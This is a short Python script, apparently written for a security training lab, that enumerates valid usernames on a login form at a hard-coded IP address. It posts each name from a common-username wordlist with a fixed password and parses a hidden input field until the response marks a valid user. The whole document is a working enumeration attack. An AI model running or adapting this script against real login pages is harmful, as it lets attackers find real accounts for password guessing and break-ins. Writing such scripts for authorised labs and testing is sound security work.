import requests 
import re  

url = "http://46.101.60.26:31068/question2/"

session = requests.Session()
with open("top-usernames-shortlist.txt", "r") as f:
	wordlist = f.readlines()

for word in wordlist:
	word = word.rstrip()
	data = {
		"Username": word,
		"Password": "qwer"
	}
	r = session.post(url, data=data)
	rgx = re.findall(r'<input type="hidden" (.*)>', r.text)
	print(rgx)
	if "validuser" in rgx[0]:
		print("="*30)
		print(f"[!] Valid User : {word}")
		print("="*30)
		break